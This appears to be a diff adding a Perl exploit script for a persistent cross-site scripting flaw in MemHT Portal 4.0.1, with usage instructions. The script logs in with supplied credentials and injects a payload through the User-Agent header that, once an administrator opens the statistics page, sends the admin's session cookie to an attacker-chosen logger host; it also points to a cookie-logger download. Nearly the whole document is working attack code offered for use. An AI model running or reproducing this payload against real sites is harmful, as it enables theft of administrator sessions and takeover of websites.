@@ -1,0 +1,113 @@
+#!/usr/bin/perl 
+# MemHT Portal 4.0.1 Persistent Cross Site Scripting Vulnerability [user agent]
+# by ZonTa - zontahackers[at]gmail[dot]com
+#
+# After successful inject wait for the admin to view statistic page.
+# Fix is available : http://www.memht.com/news_149_MemHT-Portal-4-0-2.html
+
+use Getopt::Std;
+use Digest::MD5('md5_hex');
+use LWP::UserAgent;
+
+my ($host,$id,$username,$password,$logger) = @ARGV;
+ 
+my $http = new LWP::UserAgent;
+my $u_agent = "]\"</td></tr><BODY ONLOAD=document.location=\"http://$logger?cookie=\"+document.cookie+\"&redirect=http://$host\">";
+my $cookies = "login_user=$id#".md5_hex($username)."#".md5_hex($password);
+
+Main::Exploit();
+
+package Main;
+
+sub Exploit 
+{    
+    if (@ARGV != 5) {
+        Main::Usage();
+    }
+    else { 
+        HTTP::UserAgent($u_agent);
+        MemHT::Login();     
+    }    
+}    
+
+sub Usage {
+ 
+return print <<EOF;
++-------------------------------------------------------------------+
+| MemHT Portal 4.0.1 Persistent Cross Site Scripting Vulnerability  |
++-------------------------[user agent]------------------------------+
+
+by ZonTa - zontahackers[at]gmail[dot]com
+ 
+Usage: perl exploit.pl host/path userId user pass logger[OPTIONS]
+
+host: target host and memht path
+userId: user id
+user: valid username
+pass: valid password
+logger: PHP loging file
+  
+Example: 
+perl exploit.pl localhost/memht 2 foo secret 192.168.1.5/logger.php 
+
+Download Logger.php -> http://pastebin.com/K6E9AWrC
+
+EOF
+}
+
+package MemHT;		
+        
+sub Login
+{
+    HTTP::Cookies($cookies);
+    my $response = HTTP::GET($host.'/index.php?page=pvtmsg&op=newMessage');
+     
+    if ($response->content =~ /access denied/i) {
+        print "Login Failed!\n";
+		exit;
+	}
+	else {
+		print "Logged In!\n";
+		print "XSS injected !";
+        
+    }	
+}
+
+package HTTP;
+
+sub UserAgent 
+{
+    return $http->agent($_[0]);
+} 
+
+sub Cookies 
+{
+    return $http->default_header('Cookie' => $_[0]);
+}
+ 
+sub GET 
+{    
+    if ($_[0] !~ m{^http://(.+?)$}i) {
+        return $http->get('http://'.$_[0]);
+    }    
+    else {
+        return $http->get($_[0]);
+    }    
+}
+     
+sub POST 
+{   
+    if ($_[0] !~ m{^http://(.+?)$}i) {
+        return $http->post('http://'.$_[0]);
+    }    
+    else {
+        return $http->post($_[0]);
+    }    
+}
+     
+sub http_header 
+{
+    return $http->default_header($_[0]);
+}  
+
+# Greetz to Sri Lankans  
